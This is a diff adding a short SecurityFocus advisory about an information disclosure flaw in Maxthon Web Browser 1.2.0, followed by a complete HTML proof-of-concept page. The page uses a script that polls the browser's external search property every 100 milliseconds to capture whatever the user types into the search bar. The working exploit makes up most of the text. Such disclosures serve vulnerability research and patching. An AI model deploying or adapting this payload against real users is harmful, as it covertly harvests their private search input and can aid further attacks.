@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/12898/info
+
+Maxthon Web Browser is reported prone to an information disclosure vulnerability. This issue may allow an attacker to disclose search bar contents from an affected browser.
+
+Information disclosed through the exploitation of this vulnerability may aid an attacker in carrying out other attacks against a vulnerable computer.
+
+Maxthon Web Browser 1.2.0 is reported to be vulnerable to this issue. Prior versions may be affected as well.
+
+<html>
+<head>
+<title>Maxthon's Search Bar Information Disclosure PoC</title>
+<script>
+function sniff() {
+try {
+s.value=external.m2_search_text;
+}
+catch(e) {}
+}
+function body_onload() {
+window.setInterval('sniff()',100);
+}
+</script>
+</head>
+<body onload="body_onload()">
+Information typed in Maxthon's search bar will be displayed here: <input type="text" id="s" value='' readonly="true" />
+</body>
+</html> 
